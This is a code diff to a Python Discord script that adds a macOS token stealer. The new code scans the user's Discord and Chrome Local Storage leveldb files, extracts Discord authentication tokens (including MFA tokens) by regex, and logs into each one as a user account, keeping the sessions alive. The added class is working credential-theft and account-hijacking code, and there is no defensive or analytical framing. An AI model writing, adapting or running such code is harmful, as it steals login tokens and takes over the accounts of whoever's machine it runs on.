@@ -1,8 +1,9 @@
-import tokenFinder
 import discord
 from discord.ext import commands
+import os
+import re
 import asyncio
-asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
 
 class Bot(commands.Bot):
     def __init__(self):
@@ -13,18 +14,50 @@ class Bot(commands.Bot):
         print("Logged into", self.user)
 
 
-def main():
-    tokens = tokenFinder.findTokens()
-    loop = asyncio.get_event_loop()
-    for token in tokens:
-        bot = Bot()
+    async def start(self, *args, **kwargs):
         try:
-            loop.create_task(bot.start(token, bot=False))
-            break
+            await super().start(*args, **kwargs)
         except:
             pass
-    else:
-        print("No tokens found")
-    loop.run_forever()
 
-main()
+
+class macFinder():
+    def __init__(self):
+        self.tokens = []
+        lib = f"/Users/{os.getlogin()}/Library/Application Support/"
+
+        paths = {
+        'Discord': lib + 'discord/Local Storage/leveldb',
+        }
+        for i in range(1, 100):
+            path = lib + f"/Google/Chrome/Profile {i}/Local Storage/leveldb"
+            if os.path.exists(path):
+                paths[f'Google Chrome Profile {i}'] = path
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            tokens = self.find_tokens(path)
+
+            for token in tokens:
+                self.tokens.append(token)
+
+
+    def find_tokens(self, path):
+        tokens = []
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+
+
+tokens = macFinder().tokens
+for token in tokens:
+    bot = Bot()
+    loop = asyncio.get_event_loop()
+    loop.create_task(bot.start(token, bot=False))
+loop.run_forever()
